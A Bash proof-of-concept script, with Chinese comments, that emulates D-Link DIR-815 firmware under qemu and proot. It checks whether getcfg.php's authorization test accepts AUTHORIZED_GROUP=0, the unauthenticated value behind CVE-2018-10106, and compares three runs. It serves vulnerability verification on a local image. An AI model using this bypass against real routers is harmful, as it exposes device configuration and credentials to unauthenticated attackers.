#!/usr/bin/env bash
# check-getcfg-authz.sh
#
# 验证 CVE-2018-10106 的权限绕过：getcfg.php 的 is_power_user() 是否把
# AUTHORIZED_GROUP=0（未登录会话的取值）当成已授权。
#
# 依赖（都不需要 root）：
#   - qemu-user 静态二进制   ~/work/qemu/usr/bin/qemu-mipsel-static
#   - proot（假根，处理 PHP 里 /htdocs 这样的绝对路径）
#       apt-get download proot libtalloc2
#       for d in proot_*.deb libtalloc2_*.deb; do dpkg-deb -x "$d" ~/work/tools/proot; done
#
# 用法：
#   ROOTFS=~/work/dir815/squashfs-root ./tools/check-getcfg-authz.sh
set -euo pipefail

ROOTFS="${ROOTFS:-./squashfs-root}"
QBIN="${QBIN:-$HOME/work/qemu/usr/bin/qemu-mipsel-static}"
PROOT_DIR="${PROOT_DIR:-$HOME/work/tools/proot}"
PROOT="$PROOT_DIR/usr/bin/proot"

die() { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

ROOTFS="$(cd "$ROOTFS" && pwd)"
[ -d "$ROOTFS" ]  || die "rootfs 不存在"
[ -x "$QBIN" ]    || die "找不到 qemu: $QBIN(见 tools/run-local.sh)"
[ -x "$PROOT" ]   || die "找不到 proot: $PROOT"
[ -f "$ROOTFS/etc/config/image_sign" ] || die "rootfs 不完整(缺 etc/config/image_sign)"

QROOT="$(cd "$(dirname "$(dirname "$QBIN")")" && pwd)"     # ~/work/qemu
QGUEST="$(realpath --relative-to="$QROOT" "$QBIN")"        # 例如 usr/bin/qemu-mipsel-static

SIGN="$(tr -d '\r\n' < "$ROOTFS/etc/config/image_sign")"
export LD_LIBRARY_PATH="$PROOT_DIR/usr/lib/x86_64-linux-gnu:${LD_LIBRARY_PATH:-}"

run_guest() {
    timeout 60 "$PROOT" -r "$ROOTFS" -b /dev -b /proc -b "$QROOT:/qemu" \
        "/qemu/$QGUEST" -L / "$@" 2>&1 | grep -v '^proot ' || true
}

cleanup() { pkill -9 -f "qemu-mipsel-static" 2>/dev/null || true; }
trap cleanup EXIT

echo "[*] rootfs     = $ROOTFS"
echo "[*] image_sign = $SIGN"

cleanup; sleep 1
mkdir -p "$ROOTFS/var/run"
rm -f "$ROOTFS/var/run/xmldb_sock" "$ROOTFS"/var/run/xmldb_sock*.pid

echo "[*] 启动 xmldb 守护进程"
( "$PROOT" -r "$ROOTFS" -b /dev -b /proc -b "$QROOT:/qemu" \
    "/qemu/$QGUEST" -L / /usr/sbin/xmldb -n "$SIGN" >/tmp/xmldb-authz.log 2>&1 & )
sleep 6
[ -S "$ROOTFS/var/run/xmldb_sock" ] || die "xmldb socket 没起来,看 /tmp/xmldb-authz.log"

a="$(run_guest /usr/sbin/xmldbc -P /htdocs/web/getcfg.php -V 'AUTHORIZED_GROUP=-1')"
b="$(run_guest /usr/sbin/xmldbc -P /htdocs/web/getcfg.php)"
c="$(run_guest /usr/sbin/xmldbc -P /htdocs/web/getcfg.php -V 'AUTHORIZED_GROUP=0')"

verdict() { if grep -q 'Not authorized' <<<"$1"; then echo "拒绝 (Not authorized)"; else echo "通过授权检查"; fi; }

echo
echo "=== 对照 ==="
printf '  AUTHORIZED_GROUP=-1 -> %s\n' "$(verdict "$a")"
printf '  不传                -> %s\n' "$(verdict "$b")"
printf '  AUTHORIZED_GROUP=0  -> %s\n' "$(verdict "$c")"

echo
if ! grep -q 'Not authorized' <<<"$c" && grep -q 'Not authorized' <<<"$a"; then
    echo "[+] 漏洞存在:AUTHORIZED_GROUP=0(未登录的取值)绕过了 getcfg.php 的授权检查"
    exit 0
fi
echo "[-] 与预期不符(环境可能没起干净)"
exit 1
